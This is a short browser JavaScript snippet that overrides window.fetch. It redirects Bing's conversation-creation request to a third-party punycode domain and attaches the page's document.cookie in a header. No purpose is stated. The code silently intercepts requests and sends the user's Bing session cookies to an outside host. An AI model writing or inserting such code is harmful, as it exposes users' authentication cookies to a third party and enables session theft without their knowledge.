{
  const oFetch = window.fetch;
  window.fetch = function(url,options){
    if("https://www.bing.com/turing/conversation/create"==url){
      url = "https://mybing1.xn--xyza.top/Create";
      options = {
        headers:{"Cookie1":document.cookie},
      };
    }
    return oFetch(url,options)
      .then((res)=>{return res;})
      .catch((err)=>{return err;});
  }
}
